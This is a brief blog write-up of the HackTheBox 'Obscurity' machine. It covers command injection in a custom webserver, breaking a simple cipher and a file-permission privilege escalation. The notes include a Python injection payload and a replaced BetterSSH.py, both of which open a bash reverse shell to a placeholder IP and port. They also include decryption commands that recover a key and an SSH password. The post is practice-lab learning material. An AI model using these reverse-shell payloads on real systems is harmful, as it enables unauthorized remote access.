---
categories:
- CTF
image:
  path: https://img.youtube.com/vi/_znY-mNj2ps/0.jpg
layout: post
media_subpath: /assets/posts/2020-05-09-obscurity-hackthebox
tags:
- command injection
- crypto
- hackthebox
- linux
title: Obscurity @ HackTheBox
---

Obscurity is a 30-point Linux machine on HackTheBox that involves exploiting a command injection in a custom webserver, breaking a simple cipher and abusing file system permissions to get root.

{% youtube _znY-mNj2ps %}

## Notes

Command injection payload:

```
';__import__("os").system("bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'")+'
```

Retrieving the key:

```
python3 SuperSecureCrypt.py -d -i out.txt -k "`cat check.txt`" -o key
```

Decrypting the ssh password:

```
python3 SuperSecureCrypt.py -d -i passwordreminder.txt -k alexandrovich -o /dev/shm/x
```

Replaced BetterSSH.py:

```python
import os
os.system("bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'")
```